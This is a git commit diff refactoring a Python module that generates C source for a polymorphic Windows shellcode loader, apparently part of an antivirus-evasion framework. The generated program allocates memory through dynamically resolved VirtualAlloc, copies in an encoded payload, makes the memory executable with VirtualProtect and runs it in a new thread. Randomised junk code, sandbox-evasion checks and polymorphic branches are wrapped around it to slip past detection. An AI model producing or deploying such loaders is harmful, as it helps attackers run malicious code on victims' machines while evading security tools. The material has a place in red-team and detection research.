57c04604f375168fadc1e5aa18efaec9ce66e415
vince-nayal <vincent.noyalet@telecomnancy.net>
2018-03-26 10:27:07 +0200

    [refactor] Reviewed & refactored Windows Polymorphic Multipath VirtualAlloc NoDirectCall LL/GPA

--- Modules/payloads/Polymorphic_MVA_NDC_LLGPA_mathinject_windows.py
+++ Modules/payloads/Polymorphic_MVA_NDC_LLGPA_mathinject_windows.py
@@ -18,10 +18,13 @@
      #                                                                                      #
      ########################################################################################
 
+import pystache
 import random, string
 import sys 
 sys.path.append("Modules/payloads/auxiliar")
 import usefull
+
+template_args = {} # Dictionnary containing all keys/values for template rendering
 
 Payload = sys.argv[1]
 
@@ -30,85 +33,102 @@ Filename = sys.argv[2]
 Encryption = sys.argv[3]
 
 Randbufname = usefull.varname_creator()
+template_args['Randbufname'] = Randbufname
 
-Payload = usefull.encoding_manager(Encryption,Payload,Randbufname) 
+template_args['Payload'] = usefull.encoding_manager(Encryption,Payload,Randbufname) 
 
-Ndcvirtual = usefull.varname_creator()
+template_args['Ndcvirtual'] = usefull.varname_creator()
 
-Ker32 = usefull.varname_creator()
+template_args['Ker32'] = usefull.varname_creator()
 
-Randlpv = usefull.varname_creator()
+template_args['Randlpv'] = usefull.varname_creator()
 
-Randhand = usefull.varname_creator()
+template_args['Randhand'] = usefull.varname_creator()
 
-Randresult = usefull.varname_creator()
+template_args['Randresult'] = usefull.varname_creator()
 
-Randthread = usefull.varname_creator()
+template_args['Randthread'] = usefull.varname_creator()
 
-Oldprot = usefull.varname_creator()
+template_args['Oldprot'] = usefull.varname_creator()
 
-Randbool = usefull.varname_creator()
+template_args['Randbool'] = usefull.varname_creator()
 
-Ndcvirtualpro = usefull.varname_creator()
-
-
-Junkcode1 = usefull.Junkmathinject(str(random.randint(1,16)))	        # Junkcode
-Junkcode2 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
-Junkcode3 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
-Junkcode4 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
-Junkcode5 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
-Junkcode6 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
-Junkcode7 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
-Junkcode8 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
-Junkcode9 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
-
-Win_eva1 = usefull.windows_evasion(str(random.randint(1,17)))
-Win_eva2 = usefull.windows_evasion(str(random.randint(1,17)))
-Win_eva3 = usefull.windows_evasion(str(random.randint(1,17)))
-Win_eva4 = usefull.windows_evasion(str(random.randint(1,17)))
+template_args['Ndcvirtualpro'] = usefull.varname_creator()
 
 
-MorphEvasion1 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
-MorphEvasion2 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
-MorphEvasion3 = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
+template_args['Junkcode1'] = usefull.Junkmathinject(str(random.randint(1,16)))	        # Junkcode
+template_args['Junkcode2'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+template_args['Junkcode3'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+template_args['Junkcode4'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+template_args['Junkcode5'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+template_args['Junkcode6'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+template_args['Junkcode7'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+template_args['Junkcode8'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+template_args['Junkcode9'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+
+template_args['Win_eva1'] = usefull.windows_evasion(str(random.randint(1,17)))
+template_args['Win_eva2'] = usefull.windows_evasion(str(random.randint(1,17)))
+template_args['Win_eva3'] = usefull.windows_evasion(str(random.randint(1,17)))
+template_args['Win_eva4'] = usefull.windows_evasion(str(random.randint(1,17)))
+
+
+template_args['MorphEvasion1'] = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
+template_args['MorphEvasion2'] = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
+template_args['MorphEvasion3'] = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
 
  
 
-Hollow_code = ""
-Hollow_code += "#include <windows.h>\n"
-Hollow_code += "#include <stdio.h>\n"
-Hollow_code += "#include <string.h>\n"
-Hollow_code += "#include <math.h>\n"
-Hollow_code += "int main(int argc,char * argv[]){\n"
-Hollow_code += Junkcode1
-Hollow_code += Junkcode2
-Hollow_code += Win_eva1
-Hollow_code += Win_eva2
-Hollow_code += Win_eva3
-Hollow_code += Win_eva4
-Hollow_code += Junkcode3
-Hollow_code += MorphEvasion1
-Hollow_code += MorphEvasion2
-Hollow_code += MorphEvasion3
-Hollow_code += Junkcode4
-Hollow_code += Payload 
-Hollow_code += "LPVOID " + Randlpv + ";" + "HANDLE " + Randhand + ";" + "DWORD " + Randresult + ";" + "DWORD " + Randthread + ";\n"
-Hollow_code += "HINSTANCE " + Ker32 + " = LoadLibrary(\"kernel32.dll\");\n"
-Hollow_code += "if(" + Ker32 + " != NULL){\n"
-Hollow_code += "FARPROC " + Ndcvirtual + " = GetProcAddress(" + Ker32 + ", \"VirtualAlloc\");\n"
-Hollow_code += Randlpv + " = (LPVOID)" + Ndcvirtual + "(NULL, strlen(" + Randbufname + "),MEM_COMMIT,PAGE_READWRITE);\n"
-Hollow_code += "RtlMoveMemory(" + Randlpv +","+ Randbufname + ",strlen(" + Randbufname + "));\n"
-Hollow_code += "DWORD " + Oldprot + ";\n"
-Hollow_code += "FARPROC " + Ndcvirtualpro + " = GetProcAddress(" + Ker32 + ", \"VirtualProtect\");\n"
-Hollow_code += "BOOL " + Randbool + " = (BOOL)" + Ndcvirtualpro + "(" + Randlpv + ",strlen(" + Randbufname + "),0x40,&" + Oldprot + ");\n"
-Hollow_code += Randhand + " = CreateThread(NULL,0," + Randlpv + ",NULL,0,&"+ Randthread + ");\n"
-Hollow_code += Randresult + " = WaitForSingleObject(" + Randhand + ",-1);}\n"
-Hollow_code += "}else{" + Junkcode6 + "}\n"
-Hollow_code += "}else{" + Junkcode7 + "}\n"
-Hollow_code += "}else{" + Junkcode8 + "}\n"
-Hollow_code += "}" + Junkcode9 + "}}}\n"
-Hollow_code += "return 0;}"
-Hollow_code = Hollow_code.encode('utf-8')
+Hollow_code = """\
+#include <windows.h>
+#include <stdio.h>
+#include <string.h>
+#include <math.h>
+
+int main(int argc,char * argv[]){
+    {{{Junkcode1}}}
+    {{{Junkcode2}}}
+    {{{Win_eva1}}}
+    {{{Win_eva2}}}
+    {{{Win_eva3}}}
+    {{{Win_eva4}}}
+    {{{Junkcode3}}}
+    {{{MorphEvasion1}}}
+        {{{MorphEvasion2}}}
+            {{{MorphEvasion3}}}
+                {{{Junkcode4}}}
+                {{{Payload}}}
+                LPVOID {{{Randlpv}}};
+                HANDLE {{{Randhand}}};
+                DWORD {{{Randresult}}};
+                DWORD {{{Randthread}}};
+                HINSTANCE {{{Ker32}}} = LoadLibrary(\"kernel32.dll\");
+                if({{{Ker32}}} != NULL){
+                    FARPROC {{{Ndcvirtual}}} = GetProcAddress({{{Ker32}}}, \"VirtualAlloc\");
+                    {{{Randlpv}}} = (LPVOID) {{{Ndcvirtual}}}(NULL, strlen({{{Randbufname}}}),MEM_COMMIT,PAGE_READWRITE);
+                    RtlMoveMemory({{{Randlpv}}}, {{{Randbufname}}}, strlen({{{Randbufname}}}));
+                    DWORD {{{Oldprot}}};
+                    FARPROC {{{Ndcvirtualpro}}} = GetProcAddress({{{Ker32}}}, \"VirtualProtect\");
+                    BOOL {{{Randbool}}} = (BOOL) {{{Ndcvirtualpro}}}({{{Randlpv}}}, strlen({{{Randbufname}}}), 0x40, &{{{Oldprot}}});
+                    {{{Randhand}}} = CreateThread(NULL, 0, {{{Randlpv}}}, NULL, 0, &{{{Randthread}}});
+                    {{{Randresult}}} = WaitForSingleObject({{{Randhand}}},-1);
+                }
+            }else{
+                {{{Junkcode6}}}
+            }
+        }else{
+            {{{Junkcode7}}}
+        }
+    }else{
+        {{{Junkcode8}}}
+    }
+    }
+    {{{Junkcode9}}}
+    }}}
+    return 0;
+}
+"""
+
+Hollow_code = pystache.render(Hollow_code, template_args)
 
 with open('Source.c','wb') as f:
     f.write(Hollow_code)
